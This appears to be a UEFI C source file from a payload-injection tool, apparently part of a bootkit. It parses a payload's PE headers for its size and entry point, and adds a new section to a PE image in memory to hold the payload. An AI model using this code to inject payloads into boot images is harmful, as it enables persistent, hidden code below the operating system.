#include <Uefi.h>
#include <Library/UefiLib.h>
#include <IndustryStandard/PeImage.h>
#include "PeStructs.h"
#include "Utils.h"
#include "Exploit.h"

VOID* ExpLoad = NULL;

UINT32 GetExpSize(VOID)
{
	EFI_IMAGE_DOS_HEADER* RecordDosImageHeader = (EFI_IMAGE_DOS_HEADER*)ExpLoad;// PayLoad;
	if (RecordDosImageHeader->e_magic != EFI_IMAGE_DOS_SIGNATURE)
		return 0;

	EFI_IMAGE_NT_HEADERS64* RecordNtHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT64)RecordDosImageHeader + RecordDosImageHeader->e_lfanew);
	if (RecordNtHeaders->Signature != EFI_IMAGE_NT_SIGNATURE)
		return 0;

	return RecordNtHeaders->OptionalHeader.SizeOfImage + 0x1000;
}

VOID* GetExpEntry(VOID* ModuleBase)
{
	EFI_IMAGE_DOS_HEADER* RecordDosImageHeader = (EFI_IMAGE_DOS_HEADER*)ExpLoad;// PayLoad;
	if (RecordDosImageHeader->e_magic != EFI_IMAGE_DOS_SIGNATURE)
		return NULL;

	EFI_IMAGE_NT_HEADERS64* RecordNtHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT64)RecordDosImageHeader + RecordDosImageHeader->e_lfanew);
	if (RecordNtHeaders->Signature != EFI_IMAGE_NT_SIGNATURE)
		return NULL;

	return (VOID*)((UINT64)ModuleBase + RecordNtHeaders->OptionalHeader.AddressOfEntryPoint);
}

VOID* CreateExpSection(VOID* ImageBase, CHAR8* SectionName, UINT32 VirtualSize, UINT32 Characteristics)
{
	EFI_IMAGE_DOS_HEADER* dosHeader = (EFI_IMAGE_DOS_HEADER*)ImageBase;
	EFI_IMAGE_NT_HEADERS64* ntHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT64)ImageBase + dosHeader->e_lfanew);
	UINT16 sizeOfOptionalHeader = ntHeaders->FileHeader.SizeOfOptionalHeader;
	EFI_IMAGE_FILE_HEADER* fileHeader = &(ntHeaders->FileHeader);
	EFI_IMAGE_SECTION_HEADER* firstSectionHeader = (EFI_IMAGE_SECTION_HEADER*)(((UINT64)fileHeader) + sizeof(EFI_IMAGE_FILE_HEADER) + sizeOfOptionalHeader);
	UINT32 numberOfSections = ntHeaders->FileHeader.NumberOfSections;
	UINT32 sectionAlignment = ntHeaders->OptionalHeader.SectionAlignment;
	UINT32 fileAlignment = ntHeaders->OptionalHeader.FileAlignment;
	EFI_IMAGE_SECTION_HEADER* newSectionHeader = &firstSectionHeader[numberOfSections];
	EFI_IMAGE_SECTION_HEADER* lastSectionHeader = &firstSectionHeader[numberOfSections - 1];
	MemCopy(&newSectionHeader->Name, SectionName, AsciiStrLen(SectionName));
	newSectionHeader->Misc.VirtualSize = VirtualSize;
#pragma warning(disable : 4146)
	newSectionHeader->VirtualAddress = (UINT32)P2ALIGNUP(lastSectionHeader->VirtualAddress + lastSectionHeader->Misc.VirtualSize, sectionAlignment);
	newSectionHeader->SizeOfRawData = (UINT32)P2ALIGNUP(VirtualSize, fileAlignment);
#pragma warning(default : 4146)
	newSectionHeader->Characteristics = Characteristics;
	newSectionHeader->PointerToRawData = (UINT32)(lastSectionHeader->PointerToRawData + lastSectionHeader->SizeOfRawData);
	++ntHeaders->FileHeader.NumberOfSections;
#pragma warning(disable : 4146)
	ntHeaders->OptionalHeader.SizeOfImage = (UINT32)P2ALIGNUP(newSectionHeader->VirtualAddress + newSectionHeader->Misc.VirtualSize, sectionAlignment);
#pragma warning(default : 4146)
	return (VOID*)(((UINT64)ImageBase) + newSectionHeader->VirtualAddress);
}